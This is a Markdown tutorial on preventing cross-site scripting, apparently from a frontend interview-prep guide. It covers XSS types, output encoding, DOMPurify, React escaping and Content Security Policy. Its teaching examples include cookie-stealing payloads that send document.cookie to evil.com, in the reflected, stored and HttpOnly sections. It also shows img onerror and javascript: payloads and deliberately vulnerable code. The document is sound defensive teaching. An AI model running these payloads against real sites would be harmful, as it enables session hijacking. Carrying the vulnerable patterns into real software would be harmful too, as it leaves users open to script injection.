# XSS Prevention

## Overview

Cross-Site Scripting (XSS) is one of the most common and dangerous web vulnerabilities. XSS allows attackers to inject malicious scripts into web pages viewed by other users, potentially stealing sensitive data, hijacking sessions, or performing actions on behalf of users. Understanding XSS prevention is critical for frontend security.

## Table of Contents
- [Types of XSS Attacks](#types-of-xss-attacks)
- [Reflected XSS](#reflected-xss)
- [Stored XSS](#stored-xss)
- [DOM-based XSS](#dom-based-xss)
- [Prevention Techniques](#prevention-techniques)
- [Output Encoding](#output-encoding)
- [DOMPurify Library](#dompurify-library)
- [React XSS Protection](#react-xss-protection)
- [Content Security Policy](#content-security-policy)
- [Interview Questions](#interview-questions)

## Types of XSS Attacks

### Attack Surface

XSS attacks exploit different entry points in web applications, categorized by how malicious scripts are injected and executed. Understanding these three attack vectors is essential for implementing comprehensive defense strategies that address each unique exploitation path.

```javascript
// Three main types of XSS
const xssTypes = {
  reflected: 'Non-persistent, comes from request',
  stored: 'Persistent, stored in database',
  domBased: 'Client-side, manipulates DOM'
};
```

## Reflected XSS

### Attack Example

Reflected XSS occurs when user input from the request (URL parameters, form data) is immediately echoed back in the response without sanitization. The malicious script executes in the victim's browser when they visit a crafted URL, often delivered through phishing emails or malicious links.

```html
<!-- Vulnerable URL: https://example.com/search?q=<script>alert('XSS')</script> -->

<!-- ❌ Vulnerable code -->
<div>
  Search results for: <?php echo $_GET['q']; ?>
</div>

<!-- Browser renders: -->
<div>
  Search results for: <script>alert('XSS')</script>
</div>
```

### Real Attack Scenario

Real-world reflected XSS attacks typically involve social engineering to trick victims into clicking malicious links. Once executed, the injected script can steal session cookies, redirect to phishing sites, or perform actions on behalf of the authenticated user.

```javascript
// Attacker sends phishing email with malicious link
const maliciousUrl = `
  https://bank.com/search?q=
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
  </script>
`;

// Victim clicks link → their session cookie is stolen
```

### Prevention

Preventing reflected XSS requires encoding user input before rendering it in HTML responses. Server-side HTML entity encoding transforms dangerous characters like `<` and `>` into safe representations, ensuring browsers display them as text rather than executing them as code.

```javascript
// ✅ Server-side encoding
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Usage
const userInput = req.query.q;
res.send(`<div>Search results for: ${escapeHtml(userInput)}</div>`);

// Output: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

## Stored XSS

Stored XSS (persistent XSS) is the most dangerous variant where malicious scripts are permanently saved in the application's database. Every user who views the compromised content executes the attacker's script, making it particularly effective for widespread attacks.

### Attack Example

Stored XSS typically targets user-generated content like comments, profiles, or messages that are saved to the database and displayed to other users. Unlike reflected XSS, the attack persists and automatically affects all subsequent visitors without requiring them to click a malicious link.

```javascript
// ❌ Vulnerable blog comment system
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // Store directly without sanitization
  db.comments.insert({ text: comment });
});

// Display comments
app.get('/post/:id', (req, res) => {
  const comments = db.comments.find({ postId: req.params.id });
  
  res.send(`
    ${comments.map(c => `<div>${c.text}</div>`).join('')}
  `);
});

// Attacker posts comment:
// <img src=x onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)">
// Now every user viewing the post gets their cookies stolen
```

### Prevention

Defending against stored XSS requires sanitization both when storing data and when displaying it. Server-side sanitization libraries like DOMPurify remove dangerous HTML while preserving safe formatting, and frontend frameworks like React provide automatic escaping for text content.

```javascript
// ✅ Server-side: Store escaped content
const DOMPurify = require('isomorphic-dompurify');

app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // Sanitize before storing
  const clean = DOMPurify.sanitize(comment);
  
  db.comments.insert({ text: clean });
});

// ✅ React: Escape on display
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          {/* React automatically escapes text content */}
          {comment.text}
        </div>
      ))}
    </div>
  );
}
```

## DOM-based XSS

DOM-based XSS occurs entirely in the client-side JavaScript without server involvement, where unsafe DOM manipulation APIs directly insert user-controlled data. This attack vector is unique because the malicious payload never reaches the server, making it invisible to server-side security measures.

### Attack Example

The vulnerability arises when JavaScript reads from unsafe sources (URL parameters, localStorage, postMessage) and writes to dangerous sinks (innerHTML, eval) without sanitization. Attackers exploit client-side routing and dynamic content generation to inject scripts that execute in the victim's browser.

```javascript
// ❌ Vulnerable code
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');

// Directly manipulating innerHTML
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;

// URL: https://example.com/?name=<img src=x onerror="alert('XSS')">
// Result: XSS executed
```

### More Dangerous Sinks

JavaScript provides numerous APIs that can execute arbitrary code when passed user input, collectively known as "dangerous sinks." Understanding and avoiding these methods is critical for preventing DOM-based XSS, as they bypass traditional server-side protections entirely.

```javascript
// ❌ All of these are dangerous with user input
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput, 100);
setInterval(userInput, 100);
new Function(userInput);
element.setAttribute('onclick', userInput);

// Dangerous jQuery methods
$('#div').html(userInput);
$('#div').append(userInput);
```

### Prevention

Preventing DOM-based XSS requires using safe DOM APIs like textContent that treat input as text, never as HTML or code. When HTML insertion is necessary, DOMPurify sanitizes the content by removing dangerous elements and attributes while preserving safe markup.

```javascript
// ✅ Use textContent instead of innerHTML
const name = urlParams.get('name');
document.getElementById('greeting').textContent = `Hello, ${name}!`;

// ✅ Create elements safely
const greeting = document.createElement('div');
greeting.textContent = `Hello, ${name}!`;
document.body.appendChild(greeting);

// ✅ Use DOMPurify for HTML content
import DOMPurify from 'dompurify';

const dirtyHTML = urlParams.get('html');
const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;
```

## Prevention Techniques

### Output Encoding Contexts

The same user input requires different encoding strategies depending on where it's rendered in the HTML document. Context-aware encoding ensures special characters are properly escaped for HTML content, attributes, JavaScript strings, URLs, and CSS to prevent injection across all rendering contexts.

```javascript
// Different contexts require different encoding

// 1. HTML Context
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 2. JavaScript Context
function encodeJS(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/</g, '\\x3c')
    .replace(/>/g, '\\x3e');
}

// 3. URL Context
function encodeURL(str) {
  return encodeURIComponent(str);
}

// 4. CSS Context (avoid user input in CSS when possible)
function encodeCSS(str) {
  return str.replace(/[^\w]/g, (match) => {
    return '\\' + match.charCodeAt(0).toString(16) + ' ';
  });
}

// Usage examples
const userInput = '<script>alert("XSS")</script>';

// In HTML
const html = `<div>${encodeHTML(userInput)}</div>`;

// In JavaScript
const js = `<script>var msg = "${encodeJS(userInput)}";</script>`;

// In URL
const url = `<a href="/search?q=${encodeURL(userInput)}">Search</a>`;
```

## DOMPurify Library

### Installation and Basic Usage

DOMPurify is the industry-standard library for sanitizing HTML by parsing and filtering out dangerous elements and attributes. It works in both browser and Node.js environments, providing a robust defense against XSS while allowing safe HTML formatting to be preserved.

```bash
npm install dompurify
# For browser + Node.js
npm install isomorphic-dompurify
```

```javascript
import DOMPurify from 'dompurify';

// Basic sanitization
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// Result: <img src="x">

// Allow specific tags
const html = '<p>Hello</p><script>alert(1)</script>';
const clean = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a']
});
// Result: <p>Hello</p>

// Allow specific attributes
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_ATTR: ['href', 'title']
});
```

### Advanced Configuration

DOMPurify's configuration options enable fine-grained control over which HTML tags, attributes, and URL schemes are permitted. Custom configurations let you define allowlists for trusted content while blocking everything else, balancing security with feature requirements.

```javascript
// Custom configuration
const config = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
};

const dirty = `
  <p>Valid content</p>
  <a href="https://safe.com">Link</a>
  <a href="javascript:alert(1)">Bad Link</a>
  <script>alert('XSS')</script>
  <img src=x onerror=alert(1)>
`;

const clean = DOMPurify.sanitize(dirty, config);
// Result: Only safe content remains
```

### React Integration

When React components need to render HTML content (like from a rich text editor or CMS), DOMPurify sanitizes it before using dangerouslySetInnerHTML. Wrapping DOMPurify in a reusable component ensures all HTML rendering goes through sanitization, preventing accidental XSS vulnerabilities.

```jsx
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  const createMarkup = (dirty) => {
    return {
      __html: DOMPurify.sanitize(dirty)
    };
  };

  return <div dangerouslySetInnerHTML={createMarkup(html)} />;
}

// Usage
function BlogPost({ content }) {
  return (
    <article>
      <SafeHTML html={content} />
    </article>
  );
}
```

### Hooks for Custom Logic

DOMPurify hooks provide extension points for custom sanitization logic, logging, or additional security checks. Hooks execute at various stages of the sanitization process, enabling teams to enforce organization-specific security policies beyond DOMPurify's defaults.

```javascript
// Add a hook to track removed elements
DOMPurify.addHook('uponSanitizeElement', (node, data) => {
  if (data.tagName === 'script') {
    console.warn('Script tag removed:', node);
  }
});

// Add custom allowed protocols
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.hasAttribute('href')) {
    const href = node.getAttribute('href');
    if (!href.match(/^https?:\/\//)) {
      node.removeAttribute('href');
    }
  }
});

const dirty = '<a href="javascript:alert(1)">Click</a>';
const clean = DOMPurify.sanitize(dirty);
// href removed because it doesn't match https?://
```

## React XSS Protection

### Built-in Protection

React's JSX automatically escapes variables rendered as text content, converting HTML special characters to their entity equivalents. This default behavior provides strong XSS protection for most use cases, making React applications secure by default when following standard patterns.

```jsx
// ✅ React automatically escapes text content
function UserGreeting({ name }) {
  // Safe: React escapes the name variable
  return <h1>Hello, {name}!</h1>;
}

// Input: <script>alert('XSS')</script>
// Output: Hello, &lt;script&gt;alert('XSS')&lt;/script&gt;!
```

### Dangerous Patterns in React

React's dangerouslySetInnerHTML API bypasses built-in XSS protections and should only be used with sanitized content. Other dangerous patterns include directly manipulating the DOM, using user input in href attributes without validation, and rendering user-controlled URLs in iframes.

```jsx
// ❌ dangerouslySetInnerHTML without sanitization
function BlogPost({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ With DOMPurify
import DOMPurify from 'dompurify';

function SafeBlogPost({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ❌ href with javascript: protocol
<a href={userInput}>Click</a>
// If userInput is "javascript:alert(1)", it executes

// ✅ Validate URLs
function SafeLink({ url, children }) {
  const safeUrl = url.match(/^https?:\/\//) ? url : '#';
  return <a href={safeUrl}>{children}</a>;
}

// ❌ Inline event handlers with user input
<button onClick={eval(userInput)}>Click</button>

// ✅ Use proper event handlers
function SafeButton({ onClick }) {
  return <button onClick={onClick}>Click</button>;
}
```

### Server-Side Rendering (SSR) XSS

Server-side rendered applications face unique XSS risks when serializing data into inline scripts for client hydration. Attackers can break out of JSON strings using closing script tags or special characters, requiring careful escaping of all data embedded in HTML responses.

```jsx
// ❌ Vulnerable SSR
app.get('/user/:id', (req, res) => {
  const userData = getUserData(req.params.id);
  
  res.send(`
    <html>
      <script>
        window.__INITIAL_DATA__ = ${JSON.stringify(userData)};
      </script>
      <div id="root"></div>
    </html>
  `);
});

// If userData contains: { name: "</script><script>alert('XSS')</script>" }
// The script tag is prematurely closed and XSS executes

// ✅ Safe SSR
function escapeJSON(json) {
  return json
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
}

app.get('/user/:id', (req, res) => {
  const userData = getUserData(req.params.id);
  const safeData = escapeJSON(JSON.stringify(userData));
  
  res.send(`
    <html>
      <script>
        window.__INITIAL_DATA__ = ${safeData};
      </script>
      <div id="root"></div>
    </html>
  `);
});
```

## Content Security Policy

### Basic CSP Header

Content Security Policy (CSP) provides a defense-in-depth layer that prevents XSS execution even if malicious scripts are injected. CSP headers instruct browsers to block inline scripts, restrict script sources, and enforce other security policies that make XSS attacks much harder to execute.

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:"
  );
  next();
});

// Blocks inline scripts
<script>alert('XSS')</script> // ❌ Blocked by CSP
```

### Nonce-based CSP

Nonce-based CSP uses cryptographically random tokens to whitelist specific inline scripts while blocking all others. The server generates a unique nonce for each request, adds it to the CSP header, and includes it in legitimate script tags, providing strong XSS protection without breaking necessary inline scripts.

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate unique nonce for each request
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'nonce-${nonce}' 'strict-dynamic'`
  );
  
  next();
});

// Template
res.send(`
  <script nonce="${res.locals.nonce}">
    // This script is allowed
    console.log('Safe script');
  </script>
  
  <script>
    // This script is blocked (no nonce)
    alert('XSS');
  </script>
`);
```

## Interview Questions

**Q1: What is XSS and what are the three main types?**

A: XSS (Cross-Site Scripting) allows attackers to inject malicious scripts into web pages.

**Three types:**
1. **Reflected XSS**: Non-persistent, payload in URL/request
   - Example: `search?q=<script>alert(1)</script>`
2. **Stored XSS**: Persistent, payload stored in database
   - Example: Malicious blog comment
3. **DOM-based XSS**: Client-side, manipulates DOM directly
   - Example: `innerHTML = location.hash`

**Q2: How does React prevent XSS?**

A: React prevents XSS by:
1. **Auto-escaping**: All text content is escaped by default
   ```jsx
   <div>{userInput}</div> // Automatically escaped
   ```
2. **Avoiding dangerous operations**: No `innerHTML` by default
3. **Explicit opt-in**: `dangerouslySetInnerHTML` name warns developers

**Not protected:**
- `dangerouslySetInnerHTML` without sanitization
- `href="javascript:..."` 
- Server-side template injection

**Q3: What is the difference between encoding and sanitization?**

A:
- **Encoding**: Converts special characters to safe equivalents
  ```javascript
  '<' → '&lt;'
  '>' → '&gt;'
  // Still preserves original intent, just safe representation
  ```

- **Sanitization**: Removes or modifies dangerous content
  ```javascript
  Input: '<p>Safe</p><script>alert(1)</script>'
  Output: '<p>Safe</p>' // Script removed entirely
  ```

**When to use:**
- **Encoding**: Displaying user text (names, comments)
- **Sanitization**: Allowing rich HTML (blog posts, WYSIWYG editors)

**Q4: How do you safely render user-generated HTML in React?**

```jsx
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Q5: What is DOM-based XSS and how is it different?**

A: DOM-based XSS occurs entirely client-side when JavaScript manipulates the DOM with untrusted data.

```javascript
// Traditional XSS: Server reflects user input
<div><?php echo $_GET['q']; ?></div>

// DOM-based XSS: Client-side manipulation
const name = location.hash.substr(1);
element.innerHTML = name; // ❌ Vulnerable
```

**Key difference**: Payload never reaches server, making it harder to detect with server-side security tools.

**Q6: What are dangerous JavaScript functions for XSS?**

```javascript
// Dangerous functions that execute code
eval(userInput);                    // Code execution
new Function(userInput);            // Code execution
setTimeout(userInput, 100);         // Code execution
setInterval(userInput, 100);        // Code execution

// Dangerous DOM manipulation
element.innerHTML = userInput;      // HTML injection
element.outerHTML = userInput;      // HTML injection
document.write(userInput);          // HTML injection
element.insertAdjacentHTML('beforeend', userInput);

// Dangerous with 'javascript:' URLs
location.href = userInput;
element.setAttribute('href', userInput);
```

**Q7: How does Content Security Policy (CSP) prevent XSS?**

A: CSP is an HTTP header that restricts resources the browser can load.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Prevents:**
- Inline scripts: `<script>alert(1)</script>` ❌ Blocked
- External scripts from untrusted domains
- `eval()` and similar functions
- Inline event handlers: `<div onclick="...">`

**Allows:**
- Scripts from same origin
- Scripts with valid nonce/hash

**Q8: What is the purpose of DOMPurify?**

A: DOMPurify is a library that sanitizes HTML to prevent XSS.

**Features:**
- Removes dangerous tags (`<script>`, `<iframe>`)
- Removes dangerous attributes (`onerror`, `onclick`)
- Removes `javascript:` URLs
- Configurable allowlists
- Works in browser and Node.js

```javascript
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// Result: <img src="x">
```

**Q9: How do you prevent XSS in URL parameters?**

```javascript
// ❌ Vulnerable
const search = new URLSearchParams(location.search).get('q');
element.innerHTML = `Results for: ${search}`;

// ✅ Safe: Use textContent
element.textContent = `Results for: ${search}`;

// ✅ Safe: Encode before inserting to HTML
const escaped = search
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;');
element.innerHTML = `Results for: ${escaped}`;

// ✅ Safe: Use DOMPurify if HTML needed
const clean = DOMPurify.sanitize(search);
element.innerHTML = `Results for: ${clean}`;
```

**Q10: What is the role of HttpOnly cookies in XSS prevention?**

A: HttpOnly flag prevents JavaScript from accessing cookies.

```javascript
// Set HttpOnly cookie (server-side)
res.cookie('sessionId', token, {
  httpOnly: true,  // Prevents document.cookie access
  secure: true,    // Only send over HTTPS
  sameSite: 'strict'
});

// Client-side: Cannot access HttpOnly cookies
console.log(document.cookie); // sessionId not visible

// Even if XSS attack succeeds:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
  // sessionId is NOT sent because it's HttpOnly
</script>
```

**Impact:**
- XSS can still execute malicious code
- But cannot steal session cookies
- Defense in depth strategy

## Summary

**XSS Prevention Checklist:**
- [ ] Encode output for the correct context (HTML, JS, URL)
- [ ] Use DOMPurify for user-generated HTML
- [ ] Avoid `innerHTML`, use `textContent` when possible
- [ ] Use React's auto-escaping (don't misuse `dangerouslySetInnerHTML`)
- [ ] Implement Content Security Policy
- [ ] Set HttpOnly flag on sensitive cookies
- [ ] Validate and sanitize on both client and server
- [ ] Use HTTPS to prevent MITM attacks

**Key Principles:**
1. **Never trust user input** - Always sanitize/encode
2. **Defense in depth** - Multiple layers of protection
3. **Context-aware encoding** - Different contexts need different encoding
4. **Use proven libraries** - DOMPurify, not custom regex
5. **Test thoroughly** - Use automated scanners and manual testing

**Performance Impact:**
- DOMPurify: ~1-5ms for typical content
- Output encoding: Negligible (<1ms)
- CSP: No runtime performance cost

---

[Back to README](./README.md) | [Next: CSRF Protection →](./02-csrf-protection.md)
